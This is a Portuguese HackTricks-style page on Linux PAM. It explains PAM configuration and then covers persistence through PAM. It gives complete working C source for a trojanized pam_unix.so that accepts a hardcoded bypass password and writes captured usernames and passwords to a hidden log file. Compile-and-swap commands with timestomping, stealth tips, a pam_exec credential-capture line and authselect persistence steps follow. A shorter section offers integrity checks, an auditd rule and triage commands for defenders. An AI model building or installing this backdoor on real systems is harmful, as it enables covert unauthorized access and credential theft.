# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informações básicas

**PAM (Pluggable Authentication Modules)** atua como um mecanismo de segurança que **verifica a identidade dos usuários que tentam acessar serviços de computador**, controlando o acesso com base em vários critérios. É semelhante a um porteiro digital, garantindo que apenas usuários autorizados possam interagir com serviços específicos e, potencialmente, limitando seu uso para evitar sobrecargas do sistema.

#### Arquivos de configuração

- O **Solaris** oferece suporte ao arquivo central legado `/etc/pam.conf`, mas as orientações atuais recomendam arquivos de serviço em `/etc/pam.d`.<sup>[[10]](#references)</sup>
- Os sistemas **Linux** preferem uma abordagem baseada em diretório, armazenando configurações específicas de serviços em `/etc/pam.d`. Por exemplo, o arquivo de configuração do serviço de login encontra-se em `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Um exemplo de configuração do PAM para o serviço de login poderia ser semelhante a este:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Esses realms, ou grupos de gerenciamento, incluem **auth**, **account**, **password** e **session**, cada um responsável por diferentes aspectos do processo de autenticação e gerenciamento de sessões:<sup>[[1]](#references)</sup>

- **Auth**: Valida a identidade do usuário, geralmente solicitando uma senha.
- **Account**: Gerencia a verificação da conta, conferindo condições como associação a grupos ou restrições de horário.
- **Password**: Gerencia atualizações de senha, incluindo verificações de complexidade ou prevenção contra dictionary attacks.
- **Session**: Gerencia ações durante o início ou o encerramento de uma sessão de serviço, como montar diretórios ou definir limites de recursos.

#### **PAM Module Controls**

Os controles determinam a resposta do módulo a sucessos ou falhas, influenciando o processo geral de autenticação. Eles incluem:<sup>[[1]](#references)</sup>

- **Required**: A falha de um módulo required resulta em uma falha eventual, mas somente depois que todos os módulos subsequentes forem verificados.
- **Requisite**: Encerramento imediato do processo após uma falha.
- **Sufficient**: Se nenhum módulo `required` anterior tiver falhado, o sucesso é retornado imediatamente e os módulos restantes no mesmo grupo de gerenciamento são ignorados.
- **Optional**: Só causa uma falha se for o único módulo na stack.

#### Offensive Semantics That Matter

Ao analisar ou modificar o PAM, a **localização de uma regra inserida** determina qual stack a verá:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` e `substack` incorporam regras de outros arquivos, portanto editar `sshd` pode afetar apenas o SSH, enquanto editar `system-auth`, `common-auth` ou outra stack compartilhada afeta vários serviços simultaneamente.<sup>[[1]](#references)[[13]](#references)</sup>
- O PAM também oferece suporte a controles entre colchetes, como `[success=1 default=ignore]`. Eles podem ser abusados para **ignorar um ou mais módulos** após uma verificação personalizada bem-sucedida, em vez de substituir visivelmente o `pam_unix.so`.<sup>[[1]](#references)</sup>
- O `module-path` pode ser **absoluto** (`/usr/lib/security/pam_custom.so`) ou **relativo** ao diretório padrão de módulos do PAM. Em sistemas Linux modernos, os diretórios reais geralmente são `/lib/security`, `/lib64/security`, `/usr/lib/security` ou caminhos multiarch, como `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Conclusão rápida para o operador: sempre mapeie o **grafo completo de serviços** antes de aplicar patches. Por exemplo, `sshd -> password-auth -> system-auth` em algumas distros ou `sshd -> system-remote-login -> system-login -> system-auth` em outras significa que o mesmo implant de uma linha pode se propagar muito mais do que o pretendido.<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

Em uma configuração com vários módulos de autenticação, o processo segue uma ordem estrita. Se o módulo `pam_securetty` descobrir que o terminal de login não é autorizado, os logins de root serão bloqueados, mas todos os módulos ainda serão processados devido ao seu status "required". O `pam_env` define variáveis de ambiente, potencialmente contribuindo para a experiência do usuário. Os módulos `pam_ldap` e `pam_unix` trabalham juntos para autenticar o usuário, com o `pam_unix` tentando usar uma senha fornecida anteriormente, aumentando a eficiência e a flexibilidade dos métodos de autenticação.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Um truque clássico de persistência em ambientes Linux de alto valor é **substituir a biblioteca PAM legítima por um drop-in trojanizado**. Em um host cuja PAM stack carrega o `pam_unix.so`, a autenticação por SSH ou console pode invocar seu entry point `pam_sm_authenticate()`; uma substituição maliciosa pode capturar credenciais ou implementar um bypass de senha *mágica*.<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
O exemplo abaixo usa o service entry point `pam_sm_authenticate()` do Linux-PAM e `pam_get_authtok()` para acessar o token de autenticação.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Compile e faça uma substituição stealth (o padrão de replacement/timestomp está documentado pela Unit 42). Ajuste tanto o caminho de backup definido diretamente no wrapper quanto os comandos abaixo para o diretório real dos módulos PAM do alvo:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Dicas de OpSec
1. **Atomic overwrite** – escreva uma library completa em um arquivo temporário e renomeie-a para o local definitivo, evitando deixar um authentication module parcialmente escrito.
2. Um caminho como `/usr/bin/.dbus.log` foi observado na análise do AuthDoor pela Unit 42, portanto também é um indicador útil para hunting.<sup>[[2]](#references)</sup>
3. Preserve os entry points esperados pelo PAM stack (por exemplo, `pam_sm_authenticate` e `pam_sm_setcred`) para que outras operações de gerenciamento continuem funcionando.<sup>[[11]](#references)[[18]](#references)</sup>

### Detecção
Para verificações de integridade de pacotes, o RPM verifica os metadados dos arquivos instalados, `debsums -s` relata erros de checksum, e `dpkg -S` no bloco de triage consulta a propriedade dos pacotes; a sintaxe de audit watch registra gravações e alterações de atributos em um caminho.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Compare o MD5/SHA256 de `pam_unix.so` com o pacote da distro.
* Use `rpm -V pam` ou `debsums -s libpam-modules` para identificar libraries substituídas sem hashing manual.
* Verifique se há permissões world-writable ou propriedade incomum em `/lib/security/`.
* Regra do `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Use Grep nas configurações do PAM em busca de módulos inesperados: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Comandos rápidos de triage (após comprometimento ou durante threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abusando de `pam_exec` para persistência
Em vez de substituir `pam_unix.so`, uma abordagem menos invasiva é acrescentar uma linha `pam_exec` em `/etc/pam.d/sshd`, para que uma invocação que alcance essa linha do PAM execute um auxiliar, mantendo a stack normal intacta.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` recebe metadados do PAM em variáveis de ambiente como `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` e `PAM_TYPE`. Com `expose_authtok`, o helper pode ler até `PAM_MAX_RESP_SIZE` bytes da senha a partir de `stdin` durante as fases `auth` ou `password`. Se quiser que o helper seja executado com o UID efetivo em vez do UID real, adicione `seteuid`.<sup>[[4]](#references)</sup>

As observações práticas a seguir abrangem os tipos de módulo e o filtro `type=` documentados para `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` é melhor para **ações pós-login**, como reabrir sockets ou iniciar um daemon desanexado.
- `auth optional pam_exec.so quiet expose_authtok ...` é a escolha usual para **captura de credenciais**, pois é executado antes da abertura da sessão.
- `type=session` ou `type=auth` pode ser usado para restringir a execução a uma fase específica do PAM e evitar uma segunda execução ruidosa.

### Sobrevivendo às ferramentas da distro: `authselect`

Em sistemas RHEL e da família Fedora que usam `authselect`, edições diretas em arquivos gerados, como `/etc/pam.d/system-auth` ou `/etc/pam.d/password-auth`, podem ser **sobrescritas pelo `authselect`**. Para obter persistência, os operadores geralmente alteram o perfil customizado ativo em `/etc/authselect/custom/<profile>/` e depois o selecionam novamente.<sup>[[5]](#references)[[19]](#references)</sup>

Fluxo de trabalho típico quando você tem root:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Isso é importante tanto para a ofensiva quanto para a triagem: se `/etc/pam.d/system-auth` contiver o banner `Generated by authselect` e `Do not modify this file manually`, o verdadeiro ponto de persistência pode estar em `/etc/authselect/custom/`, e não em `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft recente observado em ataques reais

Relatórios recentes de 2025 sobre o backdoor **Plague** para Linux mostraram a mesma ideia central levada além: um componente PAM malicioso com uma **senha de bypass estática**, além da limpeza de variáveis de ambiente relacionadas ao SSH e do histórico do shell (`HISTFILE=/dev/null`) para reduzir os rastros da sessão após o login.<sup>[[3]](#references)</sup> Esse é um padrão útil para hunting, pois a lógica do backdoor pode estar no PAM, enquanto os artefatos de stealth só aparecem **após** a autenticação ser bem-sucedida.


## References

- [1] [pam.conf(5) / pam.d(5) - Manual do Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [O manual do operador covert: infiltração de redes globais de telecomunicações - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: um backdoor baseado em PAM recém-descoberto para Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Manual do Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configurando a autenticação de usuários usando authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Página de manual do Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Gerenciando a autenticação no Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Manual do Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Manual do Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Guia de autenticação em nível de sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Lista de arquivos do pacote Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Manual do Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Manual do Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Manual do Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Make Authselect Mandatory - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
